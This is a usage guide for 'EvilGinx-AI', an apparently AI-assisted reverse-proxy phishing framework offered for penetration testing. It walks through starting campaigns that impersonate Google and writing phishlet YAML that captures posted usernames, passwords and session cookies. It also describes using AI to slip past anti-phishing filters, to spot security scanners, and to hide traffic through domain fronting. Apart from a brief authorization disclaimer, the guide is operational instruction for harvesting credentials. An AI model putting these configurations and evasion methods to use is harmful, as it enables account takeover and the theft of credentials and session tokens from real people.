# EvilGinx-AI Usage Guide

This comprehensive guide will walk you through using EvilGinx-AI for authorized penetration testing and security research.

## Table of Contents

1. [Getting Started](#getting-started)
2. [Dashboard Overview](#dashboard-overview)
3. [Creating Phishing Campaigns](#creating-phishing-campaigns)
4. [AI-Powered Features](#ai-powered-features)
5. [Phishlet Management](#phishlet-management)
6. [Session Analysis](#session-analysis)
7. [Advanced Techniques](#advanced-techniques)
8. [Best Practices](#best-practices)

## Getting Started

### Initial Setup

After installation, follow these steps to get started:

1. **Configure API Key**
   ```bash
   # Edit the configuration file
   nano config/config.yaml
   
   # Add your Gemini API key
   gemini_api_key: 'YOUR_API_KEY_HERE'
   ```

2. **Start the Framework**
   ```bash
   ./run.sh
   ```

3. **Access Dashboard**
   - Open browser to `http://localhost:8080`
   - Verify all services are running (green indicators)

### First-Time Configuration

1. **Domain Setup**
   - Configure your phishing domain in `config/config.yaml`
   - Set up DNS records to point to your server
   - Consider using a subdomain for testing

2. **SSL Certificates**
   - Generate or obtain SSL certificates for HTTPS
   - Configure certificate paths in the config file

## Dashboard Overview

### Main Interface

The dashboard provides several key sections:

#### Status Cards
- **Active Sessions**: Current victim sessions
- **Captured Credentials**: Successfully captured login data
- **AI Detections**: Scanner/bot detections by AI
- **Blocked Requests**: Filtered malicious traffic

#### Navigation Tabs
- **Campaigns**: Manage phishing campaigns
- **Phishlets**: Configure target service templates
- **Sessions**: View captured session data
- **AI Tools**: Access AI-powered features
- **Logs**: Monitor system activity

### Real-Time Monitoring

The dashboard updates in real-time, showing:
- New session connections
- Credential captures
- AI threat detections
- System status changes

## Creating Phishing Campaigns

### Campaign Planning

Before starting a campaign:

1. **Define Objectives**
   - What are you testing?
   - Which users/systems are in scope?
   - What success metrics will you use?

2. **Select Target Service**
   - Choose appropriate phishlet
   - Verify target service compatibility
   - Test phishlet functionality

3. **Prepare Infrastructure**
   - Set up phishing domain
   - Configure DNS records
   - Prepare email delivery method

### Campaign Execution

1. **Start Campaign**
   ```bash
   # Via dashboard
   Click "Start Campaign" → Select phishlet → Configure settings
   
   # Via API
   curl -X POST http://localhost:8080/api/campaigns/start \
        -H "Content-Type: application/json" \
        -d '{"phishlet": "google", "domain": "accounts-google.phish-domain.com"}'
   ```

2. **Monitor Progress**
   - Watch dashboard for incoming sessions
   - Monitor AI detection alerts
   - Track credential capture rate

3. **Analyze Results**
   - Review captured sessions
   - Analyze user behavior patterns
   - Generate reports

## AI-Powered Features

### Request Analysis

The AI system analyzes incoming requests to detect:

- **Security Scanners**: Nmap, Nikto, Burp Suite, etc.
- **Automated Bots**: Crawlers, scrapers, monitoring tools
- **Suspicious Patterns**: Unusual headers, request sequences

#### Example Analysis
```python
# Test AI detection
test_request = {
    "ip": "192.168.1.100",
    "user_agent": "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "method": "GET",
    "path": "/admin",
    "headers": {"User-Agent": "Nmap"}
}

# AI will classify this as a scanner with high confidence
```

### Content Generation

AI can modify phishing content to:

- **Evade Detection**: Subtle text variations
- **Improve Believability**: Context-aware modifications
- **Bypass Filters**: Anti-phishing system evasion

#### Content Modification Process
1. Original content is analyzed
2. AI identifies modification opportunities
3. Subtle changes are applied
4. Functionality is preserved

### Phishlet Generation

AI assists in creating phishlets by:

- **Analyzing Target Sites**: Identifying login forms and flows
- **Suggesting Configurations**: Proxy rules and filters
- **Extracting Patterns**: Credential and session token patterns

## Phishlet Management

### Understanding Phishlets

Phishlets are configuration files that define:

- **Target Service**: Which service to impersonate
- **Proxy Rules**: How to handle requests/responses
- **Credential Extraction**: How to capture login data
- **Session Management**: How to handle authentication tokens

### Creating Custom Phishlets

1. **Analyze Target Service**
   ```bash
   # Use AI to analyze target
   curl -X POST http://localhost:8080/api/ai/generate-phishlet \
        -H "Content-Type: application/json" \
        -d '{"target_url": "https://login.example.com"}'
   ```

2. **Configure Proxy Hosts**
   ```yaml
   proxy_hosts:
     - phish_sub: 'login'
       orig_sub: 'login'
       domain: 'example.com'
       session: true
       is_landing: true
   ```

3. **Set Up Filters**
   ```yaml
   sub_filters:
     - triggers_on: 'login.example.com'
       orig_sub: 'login'
       domain: 'example.com'
       search: 'login.example.com'
       replace: '{hostname}'
       mimes: ['text/html']
   ```

4. **Define Credentials**
   ```yaml
   credentials:
     username:
       key: 'username'
       search: '(.*)'
       type: 'post'
     password:
       key: 'password'
       search: '(.*)'
       type: 'post'
   ```

### Testing Phishlets

1. **Local Testing**
   - Test with curl or browser
   - Verify proxy functionality
   - Check credential extraction

2. **AI Validation**
   - Use AI to analyze phishlet effectiveness
   - Get suggestions for improvements

## Session Analysis

### Session Data Structure

Each captured session contains:

```json
{
  "session_id": "unique_identifier",
  "timestamp": 1234567890,
  "ip": "192.168.1.100",
  "user_agent": "Mozilla/5.0...",
  "phishlet": "google",
  "credentials": {
    "username": "victim@example.com",
    "password": "password123"
  },
  "cookies": {
    "session_token": "abc123...",
    "auth_cookie": "xyz789..."
  },
  "status": "captured"
}
```

### Analysis Techniques

1. **Credential Analysis**
   - Password complexity patterns
   - Common password usage
   - Account enumeration results

2. **Behavioral Analysis**
   - Time between login attempts
   - Navigation patterns
   - Device/browser fingerprints

3. **Success Rate Analysis**
   - Conversion rates by target
   - Effectiveness by time of day
   - Geographic patterns

### AI-Powered Insights

Use AI to analyze session data:

```bash
# Generate analysis report
curl -X POST http://localhost:8080/api/ai/analyze-sessions \
     -H "Content-Type: application/json" \
     -d '{"session_ids": ["session1", "session2"]}'
```

## Advanced Techniques

### Evasion Strategies

1. **Domain Fronting**
   - Use CDN services for domain fronting
   - Hide true destination from network monitoring

2. **Traffic Obfuscation**
   - Encrypt communications
   - Use non-standard ports
   - Implement traffic padding

3. **Behavioral Mimicry**
   - Mimic legitimate user patterns
   - Implement realistic delays
   - Use varied request patterns

### Integration with Other Tools

1. **Gophish Integration**
   - Use for email delivery
   - Track email open rates
   - Coordinate campaigns

2. **Social Engineering Toolkit (SET)**
   - Combine with SET payloads
   - Multi-vector attacks

3. **Custom Scripts**
   - Automate campaign management
   - Custom reporting tools
   - Integration with SIEM systems

### Advanced AI Features

1. **Custom AI Models**
   - Train models on specific targets
   - Improve detection accuracy
   - Customize evasion techniques

2. **Behavioral Learning**
   - Learn from successful campaigns
   - Adapt to defensive measures
   - Improve over time

## Best Practices

### Operational Security

1. **Infrastructure Security**
   - Use dedicated servers
   - Implement network segmentation
   - Regular security updates

2. **Data Protection**
   - Encrypt captured data
   - Secure data transmission
   - Implement data retention policies

3. **Access Control**
   - Strong authentication
   - Role-based access
   - Audit logging

### Legal and Ethical Considerations

1. **Authorization**
   - Always obtain written permission
   - Define scope clearly
   - Document authorization

2. **Data Handling**
   - Minimize data collection
   - Secure data storage
   - Proper data disposal

3. **Reporting**
   - Comprehensive documentation
   - Clear recommendations
   - Responsible disclosure

### Performance Optimization

1. **Resource Management**
   - Monitor system resources
   - Optimize for scale
   - Implement caching

2. **Network Optimization**
   - Use CDNs when appropriate
   - Optimize proxy performance
   - Monitor latency

3. **AI Optimization**
   - Cache AI responses
   - Batch API calls
   - Monitor API usage

### Troubleshooting Common Issues

1. **Connection Problems**
   - Check firewall settings
   - Verify DNS configuration
   - Test network connectivity

2. **AI API Issues**
   - Verify API key validity
   - Check quota limits
   - Monitor error rates

3. **Performance Issues**
   - Monitor resource usage
   - Optimize configurations
   - Scale infrastructure

## Conclusion

EvilGinx-AI provides powerful capabilities for authorized penetration testing. By following this guide and adhering to best practices, you can effectively use this tool to assess and improve your organization's security posture.

Remember: Always use this tool responsibly and only with proper authorization. The goal is to improve security, not to cause harm.

For additional support and advanced techniques, refer to the project documentation and community resources.

